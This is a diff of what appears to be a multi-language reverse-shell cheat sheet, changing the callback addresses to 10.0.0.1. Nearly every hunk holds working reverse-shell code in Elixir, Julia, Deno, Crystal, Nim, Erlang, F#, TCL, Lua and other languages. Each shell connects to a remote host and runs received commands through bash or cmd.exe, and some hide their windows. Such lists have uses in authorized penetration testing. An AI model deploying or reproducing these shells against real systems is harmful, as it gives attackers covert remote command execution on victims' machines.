@@ -472,7 +472,7 @@ NOTES: https://github.com/Potato-Industries/elixrs
 ```
 defmodule Elixrs do
    def main do
-      case :gen_tcp.connect({192,168,8,139}, 9090, [:binary, active: false, send_timeout: 5000]) do
+      case :gen_tcp.connect({10,0,0,1}, 9090, [:binary, active: false, send_timeout: 5000]) do
          {:ok, sock} -> 
             loop(sock)
          _ ->
@@ -553,7 +553,7 @@ actor Main
   new create(env: Env) =>
     try
       TCPConnection(env.root as AmbientAuth,
-        recover ReadNotify(env) end, "192.168.8.139", "9090")
+        recover ReadNotify(env) end, "10.0.0.1", "9090")
     end
 ```
 
@@ -562,7 +562,7 @@ actor Main
 NOTES: https://github.com/Potato-Industries/jrs
 
 ```
-julia --eval 'using Sockets;c = connect("192.168.8.139", 9090);while true;cmd = readline(c, keep=true);try;println(c, read(`/bin/bash -c $cmd`, String));catch e;print(c, e);end;end'
+julia --eval 'using Sockets;c = connect("10.0.0.1", 9090);while true;cmd = readline(c, keep=true);try;println(c, read(`/bin/bash -c $cmd`, String));catch e;print(c, e);end;end'
 ```
 
 ### Chicken
@@ -571,7 +571,7 @@ NOTES: https://github.com/Potato-Industries/chickenrs
 
 ```
 (import (chicken tcp) (chicken io) (chicken process))
-(define-values (sr sw) (tcp-connect "192.168.8.139" 9090))
+(define-values (sr sw) (tcp-connect "10.0.0.1" 9090))
 (define-values (pr pw ps) (process "/bin/bash"))
 
 (define (lines)
@@ -596,7 +596,7 @@ NOTES: https://github.com/Potato-Industries/chickenrs
 NOTES: https://github.com/Potato-Industries/denors
 
 ```
-const c = await Deno.connect({ hostname: "192.168.8.139", port: 9090, transport: "tcp" });
+const c = await Deno.connect({ hostname: "10.0.0.1", port: 9090, transport: "tcp" });
 while(1) {
     let buf=new Uint8Array(1024);
     const n=await c.read(buf) || 0;
@@ -627,7 +627,7 @@ while(1) {
 NOTES: https://github.com/Potato-Industries/rrs
 
 ```
-await IO::Socket::Async.connect('localhost', 9090).then( -> $promise {
+await IO::Socket::Async.connect('10.0.0.1', 9090).then( -> $promise {
     while 1 {
         given $promise.result {
             react {
@@ -653,7 +653,7 @@ require "process"
 require "socket"
 
 c = Socket.tcp(Socket::Family::INET)
-c.connect "192.168.1.38", 9090
+c.connect "10.0.0.1", 9090
 while true
    m, l = c.receive
    p = Process.new(m.rstrip('\n'), output: Process::Redirect::Pipe, shell: true)
@@ -670,7 +670,7 @@ import std.process, std.socket;
 
 void main()
 {
-   Socket sock = new TcpSocket(new InternetAddress("192.168.1.38", 9090));
+   Socket sock = new TcpSocket(new InternetAddress("10.0.0.1", 9090));
    while (true)
    {
       char[] line;
@@ -721,7 +721,7 @@ fn exec(path string) string {
 }
 
 fn main() {
-        mut conn := net.dial_tcp('localhost:8080') ?
+        mut conn := net.dial_tcp('10.0.0.1:8080') ?
         mut reader := io.new_buffered_reader(reader: conn)
         for {
                 result := reader.read_line() or { return }
@@ -743,7 +743,7 @@ var client = StreamPeerTCP.new()
 func _ready():
 	OS.set_window_minimized(true)
 	set_process(true)
-	client.connect_to_host("192.168.1.101", 9999)
+	client.connect_to_host("10.0.0.1", 9999)
         
 func _process(delta):
 	var bytes = client.get_available_bytes()
@@ -769,7 +769,7 @@ love.window.close()
 function gogogo ()
   local s=require("socket");
   local t=assert(s.tcp());
-  t:connect("127.0.0.1", 80);
+  t:connect("10.0.0.1", 80);
   while true do
     local r,x=t:receive();local f=assert(io.popen(r));
     local b=assert(f:read("*a"));t:send(b);
@@ -792,7 +792,7 @@ NOTES: https://github.com/Potato-Industries/nimrs
 import net, streams, osproc
 
 let c: Socket = newSocket()
-c.connect("127.0.0.1", Port(443))
+c.connect("10.0.0.1", Port(443))
 
 var p = startProcess("cmd.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
 var input = p.inputStream()
@@ -827,7 +827,7 @@ NOTES: https://github.com/Potato-Industries/erlrs
 -export([main/0, loop/1]).
 
 main() ->
-    case gen_tcp:connect("127.0.0.1", 8080,
+    case gen_tcp:connect("10.0.0.1", 8080,
                 [{active,false},
                 {send_timeout, 5000},
                 {packet, line}]) of
@@ -880,7 +880,7 @@ let rec asyncStdout (stream: System.Net.Sockets.NetworkStream, cmd: Process) =
 let main =
     let client = new System.Net.Sockets.TcpClient()
     
-    client.Connect("127.0.0.1", 8080)
+    client.Connect("10.0.0.1", 8080)
 
     let stream = client.GetStream()
 
@@ -910,7 +910,7 @@ main
 ### TCL
 
 ```
-set chan [socket 192.168.8.139 9090]
+set chan [socket 10.0.0.1 9090]
 while 1 {
    puts $chan [exec /bin/bash -c [gets $chan]]
    flush $chan
